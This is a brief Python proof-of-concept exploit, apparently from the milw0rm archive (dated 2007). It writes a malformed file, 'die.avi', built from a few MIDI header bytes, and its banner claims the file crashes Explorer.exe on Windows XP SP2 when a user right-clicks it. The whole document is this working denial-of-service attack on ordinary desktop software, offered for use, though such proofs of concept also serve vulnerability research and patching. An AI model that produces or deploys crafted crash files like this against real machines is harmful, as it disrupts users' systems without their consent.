print "-----------------------------------------------------------------------------------"
print "Explorer.exe version 6.0.2900.2180 .avi file Denial of Service"
print "author: shinnai"
print "mail: shinnai[at]autistici[dot]org"
print "site: http://shinnai.altervista.org"
print "Tested on Windows XP Professional SP2 all patched"
print "right click of the mouse on the file to see Explorer.exe die"
print "-----------------------------------------------------------------------------------"

fileOut = open('die.avi','wb')
fileOut.write('\x4D\x54\x68\x64\x00\x00\x00\x06\x00\x00\x00\x00\x00\x00')
fileOut.close()

# milw0rm.com [2007-01-24]
